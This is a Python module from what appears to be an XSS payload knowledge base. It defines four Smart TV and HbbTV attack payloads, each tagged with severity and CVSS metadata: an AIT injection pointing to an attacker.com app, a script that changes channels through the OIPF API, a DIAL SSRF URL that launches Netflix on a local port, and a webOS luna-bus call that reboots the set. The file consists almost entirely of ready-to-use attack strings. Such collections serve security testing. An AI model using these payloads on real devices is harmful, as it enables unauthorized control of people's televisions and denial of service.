#!/usr/bin/env python3
"""
Project: BRS-KB (BRS XSS Knowledge Base)
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2026-01-10 UTC
Status: Created
Telegram: https://t.me/EasyProTech

Smart TV / HbbTV XSS Payloads
"""

from ..models import PayloadEntry

SMART_TV_PAYLOADS = {
    "hbbtv_ait_injection": PayloadEntry(
        payload="http://attacker.com/malicious_app.html",
        contexts=["url", "hbbtv"],
        severity="high",
        cvss_score=7.0,
        description="Malicious URL in AIT (Application Information Table)",
        tags=["smart-tv", "hbbtv", "ait", "broadcast"],
        reliability="low",
        attack_surface="push",
    ),
    "hbbtv_oipf_tuning": PayloadEntry(
        payload="<script>var v = document.getElementById('video'); v.setChannel(oipfObjectFactory.createChannelConfig().channelList[0]);</script>",
        contexts=["javascript", "hbbtv"],
        severity="medium",
        cvss_score=6.0,
        description="Unauthorized channel change via OIPF API",
        tags=["smart-tv", "oipf", "tuning"],
        reliability="high",
        attack_surface="client",
    ),
    "dial_protocol_ssrf": PayloadEntry(
        payload="http://127.0.0.1:8008/apps/Netflix",
        contexts=["url"],
        severity="medium",
        cvss_score=5.0,
        description="DIAL protocol SSRF to launch local apps",
        tags=["smart-tv", "dial", "ssrf", "netflix"],
        reliability="medium",
        attack_surface="client",
    ),
    "webos_service_bridge": PayloadEntry(
        payload="webOS.service.request('luna://com.webos.service.systemservice', {method: 'reboot', parameters: {}});",
        contexts=["javascript", "embedded"],
        severity="high",
        cvss_score=7.5,
        description="webOS service bridge injection (reboot)",
        tags=["smart-tv", "webos", "luna-bus", "denial-of-service"],
        reliability="high",
        attack_surface="client",
    ),
}

SMART_TV_TOTAL = len(SMART_TV_PAYLOADS)
